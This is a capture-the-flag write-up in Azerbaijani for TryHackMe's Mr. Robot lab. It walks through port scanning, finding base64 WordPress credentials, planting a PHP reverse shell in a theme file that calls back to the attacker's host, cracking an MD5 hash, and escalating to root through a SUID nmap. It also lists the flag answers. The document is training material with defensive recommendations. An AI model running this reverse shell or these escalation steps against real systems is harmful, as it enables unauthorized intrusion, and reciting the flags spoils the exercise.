# 🤖 TryHackMe — Mr. Robot CTF Writeup (Azərbaycanca)

> **Çətinlik:** Orta (Medium)  
> **Hədəf:** 3 flag tapmaq (key-1-of-3, key-2-of-3, key-3-of-3)  
> **Texnologiya:** WordPress, PHP Reverse Shell, MD5 Crack, Nmap SUID

---

## 📋 Flaglar — Cavablar

| Flag | Hash |
|------|------|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bede3eb39f959` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

---

## 🗺️ Hücum Axışı

```
Nmap SYN skanı → firewall bloklayır
    ↓
Nmap ACK skanı → portlar unfiltered görünür
    ↓
Gobuster → WordPress saytı aşkar edilir
    ↓
robots.txt → KEY 1 + fsocity.dic wordlist tapılır
    ↓
/license → Base64 credentials tapılır
    ↓
WordPress Admin panelinə giriş
    ↓
Theme Editor → 404.php → PHP Reverse Shell
    ↓
Shell: daemon istifadəçisi
    ↓
/home/robot/ → MD5 hash tapılır → CrackStation → robot şifrəsi
    ↓
SSH: robot istifadəçisi → KEY 2
    ↓
find SUID → nmap SUID var → nmap --interactive → !sh → ROOT → KEY 3
```

---

## Addım 1 — Kəşfiyyat (Nmap)

### 1.1 — SYN Skanı

```bash
nmap -sS -p- <TARGET_IP>
```

**Nəticə:**
```
PORT    STATE    SERVICE
22/tcp  filtered ssh
80/tcp  filtered http
443/tcp filtered https
```

Bütün portlar **filtered** — bu o deməkdir ki, bir **firewall** SYN paketlərini bloklayır.

> **SYN skanı nədir?** `-sS` flag-i yarımçıq TCP bağlantısı açır (SYN göndərir, ACK göndərmir). Sürətli və gizlidir — lakin firewall tərəfindən bloklanabilir.

### 1.2 — Firewall-ı Keçmək: ACK Skanı

```bash
nmap -sA -p 22,80,443 <TARGET_IP>
```

**Nəticə:**
```
PORT    STATE      SERVICE
22/tcp  unfiltered ssh
80/tcp  unfiltered http
443/tcp unfiltered https
```

Portlar **unfiltered** — yəni firewall **stateful**-dur: SYN paketlərini bloklayır, amma ACK paketlərini buraxır.

> **ACK skanı nədir?** `-sA` flag-i ACK paketi göndərir. Firewall-ın davranışını anlamaq üçün istifadə olunur — portun açıq/bağlı olduğunu deyil, firewall-ın onu filtrələyib-filtrələmədiyini göstərir.

### 1.3 — Servis Versiyası Skanı

```bash
nmap -sV -p 80,443 <TARGET_IP>
```

Port 80 və 443-də **Apache** web server işləyir.

---

## Addım 2 — Web Saytı Analizi

Brauzerdə `http://<TARGET_IP>` açırıq. Qarşımıza **Mr. Robot serialına** aid interaktiv terminal interfeysi çıxır. Bir neçə komanda sınayırıq (`prepare`, `fsociety`, `inform`, `question`, `wakeup`, `join`) — maraqlı bir şey tapılmır.

---

## Addım 3 — Gobuster ilə Qovluq Taraması

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan mühüm qovluqlar:**

```
/robots.txt
/license
/wp-login.php
/wp-admin
/wp-content
/wp-includes
```

`wp-` prefiksi görünür — bu **WordPress** saytıdır!

---

## Addım 4 — robots.txt və KEY 1

`http://<TARGET_IP>/robots.txt` açırıq:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

İki fayl var:

### KEY 1 — İlk Flag

```bash
curl http://<TARGET_IP>/key-1-of-3.txt
```

```
073403c8a58a1f80d943455fb30724b9
```

🏁 **Key 1 tapıldı!**

### fsocity.dic — Wordlist

```bash
wget http://<TARGET_IP>/fsocity.dic
wc -l fsocity.dic
# 858160 sətir
```

Bu böyük wordlist-dir — WordPress üçün brute-force işlədə bilərik. Amma əvvəl `/license` faylını yoxlayaq.

---

## Addım 5 — /license Faylından Credentials Tapmaq

`http://<TARGET_IP>/license` açırıq. Səhifənin aşağısında **Base64** kodlanmış mətn var:

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

**Decode edirik:**

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
```

**Nəticə:**

```
elliot:ER28-0652
```

✅ **Credentials tapıldı:**
- **İstifadəçi adı:** `elliot`
- **Şifrə:** `ER28-0652`

> **Base64 nədir?** İkili məlumatı mətn formatına çevirmək üçün istifadə olunan kodlama üsuludur. Şifrələmə deyil — sadəcə kodlamadır, asanlıqla decode olunur.

---

## Addım 6 — WordPress Admin Panelinə Giriş

`http://<TARGET_IP>/wp-login.php` açırıq:

```
Username: elliot
Password: ER28-0652
```

✅ **WordPress Admin panelə daxil olduq!**

---

## Addım 7 — RCE: Theme Editor ilə Reverse Shell

WordPress admin panelindən **Remote Code Execution (RCE)** əldə etmək üçün **Theme Editor** istifadə edirik.

### 7.1 — Theme Editor-ə Keçid

```
Appearance → Theme Editor → TwentyFifteen → 404.php
```

### 7.2 — PHP Reverse Shell Kodu

`404.php` faylının bütün məzmununu silib aşağıdakı kodu yazırıq:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'");
?>
```

`<YOUR_IP>` yerinə öz AttackBox IP-ni yaz (məs. `10.10.X.X`).

**"Update File"** düyməsinə basırıq.

### 7.3 — Netcat Dinləyicisi Aç

```bash
nc -lvnp 4444
```

### 7.4 — Shell-i Tetikləmək

Brauzerdə bu URL-i açırıq:

```
http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php
```

**Netcat konsolunda shell gəlir:**

```
connect to [YOUR_IP] from TARGET_IP
bash: no job control in this shell
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$
```

✅ **`daemon` istifadəçisi kimi shell aldıq!**

### 7.5 — Shell-i Stabilləşdirmək

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Addım 8 — robot İstifadəçisini Tapıb KEY 2 Almaq

### 8.1 — İstifadəçiləri Yoxlamaq

```bash
cat /etc/passwd | grep -v nologin
```

**`robot`** istifadəçisi var.

### 8.2 — /home/robot/ Qovluğu

```bash
ls -la /home/robot/
```

```
-r-------- 1 robot robot 33 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 password.raw-md5
```

`key-2-of-3.txt` faylını oxumaq üçün icazəmiz yoxdur — `robot` istifadəçisi olmalıyıq.

### 8.3 — MD5 Hashı Crack Etmək

```bash
cat /home/robot/password.raw-md5
```

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**CrackStation.net** saytına giririk, hashı yapışdırırıq:

```
c3fcd3d76192e4007dfb496cca67e13b → abcdefghijklmnopqrstuvwxyz
```

✅ **robot-un şifrəsi: `abcdefghijklmnopqrstuvwxyz`**

> **MD5 nədir?** Məlumatı sabit uzunluqda hash dəyərinə çevirən funksiya. Lakin **kriptoqrafik cəhətdən sınıq** sayılır — eyni mətn həmişə eyni hash verir, buna görə wordlist ilə crack oluna bilir.

### 8.4 — robot istifadəçisinə Keçid

```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

### 8.5 — KEY 2

```bash
cat /home/robot/key-2-of-3.txt
```

```
822c73956184f694993bede3eb39f959
```

🏁 **Key 2 tapıldı!**

---

## Addım 9 — Privilege Escalation: Nmap SUID

### 9.1 — SUID Binarylərini Tapmaq

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Nəticə (mühüm olanlar):**

```
/usr/local/bin/nmap
/bin/ping
/usr/bin/passwd
...
```

**`/usr/local/bin/nmap`** — SUID biti var! Bu çox nadir haldır və privilege escalation üçün istifadə oluna bilər.

> **SUID nədir?** Set User ID — faylı işlədəndə faylın sahibinin (bu halda root) icazələri ilə işlənir. `nmap`-in sahibi `root`-dur, SUID varsa — nmap root kimi işləyir.

### 9.2 — GTFOBins: Nmap Interactive Mode

[GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#suid) səhifəsinə görə, köhnə `nmap` versiyalarında `--interactive` rejimi var:

```bash
nmap --interactive
```

```
Starting Nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap>
```

Interactive rejimdə shell komandası işlədirik:

```
nmap> !sh
```

```
# whoami
root
# id
uid=0(root) gid=0(root)
```

✅ **ROOT oldunuq!**

---

## Addım 10 — KEY 3 (Root Flag)

```bash
ls /root/
cat /root/key-3-of-3.txt
```

```
04787ddef27c3dee1ee161b21670b4e4
```

🏆 **Key 3 tapıldı! CTF tamamlandı!**

---

## 🔍 İstifadə Olunan Zəifliklər

| Zəiflik | Mərhələ | Şiddət |
|---------|---------|--------|
| Həssas məlumat robots.txt-də | Key 1 + wordlist | 🟡 Orta |
| Base64 credentials /license-də | Admin girişi | 🔴 Kritik |
| WordPress Theme Editor RCE | Shell almaq | 🔴 Kritik |
| MD5 şifrə hashı (zəif) | robot şifrəsi | 🔴 Kritik |
| Nmap SUID misconfiguration | Root-a qalxmaq | 🔴 Kritik |

---

## 🛡️ Tövsiyələr

1. **robots.txt-də həssas fayl adları saxlamayın** — Bu fayl hamıya açıqdır.
2. **Credentials-ı Base64 ilə "gizlətməyin"** — Base64 şifrələmə deyil, sadəcə kodlamadır.
3. **WordPress Theme Editor-ə girişi məhdudlaşdırın** — Admin paneli RCE üçün istifadə oluna bilər.
4. **MD5 əvəzinə bcrypt/argon2 istifadə edin** — MD5 hashları saniyələr içində crack olunur.
5. **SUID bit-ini lazımsız binarylərə verməyin** — Xüsusilə `nmap`, `vim`, `find` kimi alətlərə SUID VERMƏYİN.
6. **Güclü şifrə istifadə edin** — `abcdefghijklmnopqrstuvwxyz` əlifba ardıcıllığıdır, anında crack olunur.

---

## 🧰 İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap -sS` | SYN port skanı |
| `nmap -sA` | ACK skanı (firewall bypass) |
| `gobuster` | Web qovluq taraması |
| `base64 -d` | Base64 decode |
| WordPress Theme Editor | PHP reverse shell yerləşdirmək |
| `nc -lvnp` | Reverse shell dinləyicisi |
| CrackStation.net | MD5 hash crack |
| `find -perm -u=s` | SUID binary axtarışı |
| `nmap --interactive` | Root shell almaq |

---

## 📖 Bu CTF-dən Öyrənilənlər

- Firewall bypass üçün ACK skanı texnikası
- WordPress saytlarında enumeration metodları
- Base64 decode ilə gizli credentials tapmaq
- WordPress Theme Editor vasitəsilə RCE
- MD5 hash cracking (CrackStation)
- SUID binary-lərlə privilege escalation
- Nmap-in köhnə versiyalarında interactive shell açmaq

---

*Bu writeup yalnız təhsil məqsədilə hazırlanmışdır. Hər zaman icazəli sistemlərə qarşı test edin.*
